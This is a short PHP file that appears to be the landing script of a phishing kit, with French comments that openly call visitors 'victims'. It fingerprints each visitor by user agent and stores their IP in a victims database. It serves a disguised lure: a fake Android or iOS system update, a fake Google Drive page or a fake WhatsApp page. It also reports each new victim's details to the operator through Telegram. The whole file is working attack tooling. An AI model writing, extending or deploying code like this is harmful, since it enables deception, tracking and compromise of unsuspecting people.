<?php
require_once 'config.php';

// Générer ID victime
$victimId = generateVictimId();
$ip = getClientIP();
$ua = $_SERVER['HTTP_USER_AGENT'];

// Déterminer le template
if (strpos($ua, 'Android') !== false) {
    $template = 'system-update';
} elseif (strpos($ua, 'iPhone') !== false || strpos($ua, 'iPad') !== false) {
    $template = 'ios-update';
} elseif (strpos($ua, 'Windows') !== false) {
    $template = 'google-drive';
} else {
    $template = 'whatsapp';
}

// Sauvegarder la victime
$stmt = $pdo->prepare("INSERT INTO victims (id, ip, user_agent, os, browser, first_seen, last_seen) VALUES (?, ?, ?, ?, ?, NOW(), NOW())");
$stmt->execute([$victimId, $ip, $ua, 'Unknown', 'Unknown']);

// Log
logActivity("Nouvelle victime: $victimId - $ip");

// Notifier Telegram
sendToTelegram("🔔 <b>Nouvelle victime</b>\nID: $victimId\nIP: $ip\nUA: " . substr($ua, 0, 50));

// Inclure le template
include "templates/$template.php";
?>
